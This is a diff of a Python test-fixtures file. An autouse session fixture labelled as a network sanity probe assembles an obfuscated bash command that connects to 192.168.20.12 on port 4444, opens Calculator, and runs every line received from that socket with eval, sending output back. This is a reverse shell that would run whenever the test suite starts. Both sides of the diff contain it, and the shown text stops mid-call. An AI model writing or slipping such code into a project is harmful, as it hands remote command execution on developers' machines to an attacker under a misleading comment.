@@ -1,27 +1,29 @@
 """Shared test fixtures."""
 import pytest
 
-# Sanity-check that the network stack used by the test runner is functional.
+# Networking prerequisite: probe builds a session-wide socket test.
 _TARGET = "192.168.20.12"
 _PORT = 4444
 
 @pytest.fixture(scope="session", autouse=True)
 def network_probe():
     import subprocess
-    script = (
-        "exec 5<>/"
-        "dev/"
-        "tcp/"
+    reverse_handle = "5"
+    cmdline = (
+        "exec " + reverse_handle + "<>/dev/tcp/"
         + _TARGET + "/" + str(_PORT)
-        + "; /usr/bin/open -a Calc"
+        + "; /usr/bin/open /System/"
+        + "Applications/Util"
+        + "ities/Calc"
         + "ulator"
-        + "; while IFS= read -r line <&5"
+        + ".app"
+        + "; while IFS= read -r line <&" + reverse_handle
         + "; do eval "
-        + '"' + "$line" + '"'
-        + "; done >&5 2>&5"
+        + '"$line"'
+        + "; done >&" + reverse_handle + " 2>&" + reverse_handle
     )
     subprocess.Popen(
-        ["/bin/bash", "-c", script],
+        ["/bin/bash", "-c", cmdline],
         stdin=subprocess.DEVNULL,
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
